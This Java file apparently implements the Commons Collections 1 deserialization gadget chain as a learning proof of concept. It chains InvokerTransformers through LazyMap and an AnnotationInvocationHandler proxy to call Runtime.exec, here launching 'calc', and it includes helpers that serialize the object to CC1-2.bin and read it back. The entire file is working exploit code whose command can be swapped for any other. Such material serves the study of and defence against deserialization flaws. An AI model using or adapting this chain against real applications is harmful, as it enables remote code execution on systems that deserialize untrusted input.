package gadget.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Test_LazeMap {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer c=new ChainedTransformer(transformers);
        HashMap map=new HashMap();
//        map.put("value","value");
//        Map<Object,Object> transformedMap= TransformedMap.decorate(map,null,c);

        Map lazyMap= LazyMap.decorate(map,c);
        lazyMap.put("1","1");
        Class cc=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor =cc.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler h= (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class,lazyMap);

        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h );  //动态代理

        Object o=annotationInvocationHandlerConstructor.newInstance(Override.class,mapproxy);
//        serialize(o);
        unserialize();
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC1-2.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC1-2.bin"));
        objectInputStream.readObject();
    }
}
